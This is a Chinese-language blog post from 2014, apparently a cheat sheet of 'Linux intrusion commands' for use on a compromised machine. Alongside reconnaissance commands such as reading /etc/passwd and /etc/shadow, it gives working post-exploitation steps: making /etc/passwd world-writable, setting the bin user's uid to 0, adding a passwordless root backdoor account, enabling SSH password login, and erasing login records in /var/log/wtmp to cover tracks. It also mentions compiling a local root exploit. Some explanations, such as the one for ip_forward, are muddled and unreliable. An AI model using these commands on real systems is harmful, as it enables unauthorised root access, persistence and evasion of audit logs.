---
layout: post
title: linux入侵常用命令
date: '2014-01-09T13:10:00.001+08:00'
author: Wenh Q
tags: 
modified_time: '2014-01-09T13:10:53.611+08:00'
blogger_id: tag:blogger.com,1999:blog-4961947611491238191.post-4749376341673506728
blogger_orig_url: http://binaryware.blogspot.com/2014/01/linux_8419.html
---

在linux系统的学习使用中我们遇到很多命令，今天我们就学习一些常用<a href="http://www.chinabyte.com/keyword/%E5%85%A5%E4%BE%B5/">入侵</a>命令，下面我们就进入正题。<br /><br />　　cat /etc/passwd 查看linux用户<br /><br />　　cat /etc/shadow 查看用户密码需要root权限<br /><br />　　cat /etc/sysconfig/network-scripts/ifcfg-ethn N代表网卡号 查看所在网卡的ip信息<br /><br />　　ifconfig 查看本机ip信息<br /><br />　　cat /etc/resolv.conf 查看DNS信息<br /><br />　　bash -i 在反弹的shell中使用可以直观显示命令<br /><br />　　bash prompt: 当你以普通限权用户身份进入的时候，一般你会有一个类似bash$的prompt。当你以Root登陆时，你的prompt会变成<br /><br />　　bash#。<br /><br />　　系统变量 : 试着echo "$USER / $EUID" 系统应该会告诉你它认为你是什么用户。<br /><br />　　echo 1&gt;/proc/sys/net/ipv4/if_forward是不是你写错了,应该是echo 1&gt;/proc/sys/net/ipv4/ip_forward,<br /><br />　　vim /proc/sys/net/ipv4/ip_forward 吧,默认是0,也就是内核不进行数据包过滤,改为1 ,让内核对数据包进行filter处理!<br /><br />　　netstat -an |grep LISTEN |grep :80 查看端口<br /><br />　　service --status-all | grep running<br /><br />　　service --status-all | grep http<br /><br />　　查看运行服务<br /><br />　　lsb_release -a 查看系统版本<br /><br />　　重启<a href="http://www.chinabyte.com/keyword/SSH/">ssh</a>服务 ：/usr/sbin/sshd stop<br /><br />　　/usr/sbin/sshd start<br /><br />　　ssd_config文件里<br /><br />　　PasswordAuthentication no,<br /><br />　　将其改为<br /><br />　　PasswordAuthentication yes<br /><br />　　远程ssh才可登录<br /><br />　　否则显示Access denied<br /><br />　　其中Usepam yes可能用来建立pam方式login，比如从其它linux主机ssh到服务端，如果关闭，则不能打开.<br /><br />　　su的菜鸟用法<br /><br />　　先chomod 777 /etc/passwd<br /><br />　　然后修改bin用户的gid和uid为0<br /><br />　　然后passwd设置bin的密码<br /><br />　　然后cp /bin/bash /sbin/nologin<br /><br />　　然后su的时候su - bin就可以到rootshell了。<br /><br />　　这个原理就是当ssh不允许root用ssh终端登陆的时候，我们又不知道root密码，的一种很菜鸟的做法<br /><br />　　还可以这样<br /><br />　　sed -i s/bin:x:1:1/bin:x:0:1/g /etc/passwd<br /><br />　　gcc prtcl2.c –o local –static –Wall<br /><br />　　echo "nosec:x:0:0::/:/bin/sh" &gt;&gt; /etc/passwd<br /><br />　　echo "nosec::-1:-1:-1:-1:-1:-1:500" &gt;&gt; /etc/shadow<br /><br />　　清空last记录 cp /dev/null /var/log/wtmp<br /><br />　　-----<br /><br />　　dd if=/dev/zero of=yourfile bs=10M count=10 建立一个100m的大文件在利用Linux Kernel &lt;= 2.6.17.4 (proc) Local Root Exploit提权的时候要用到的<br />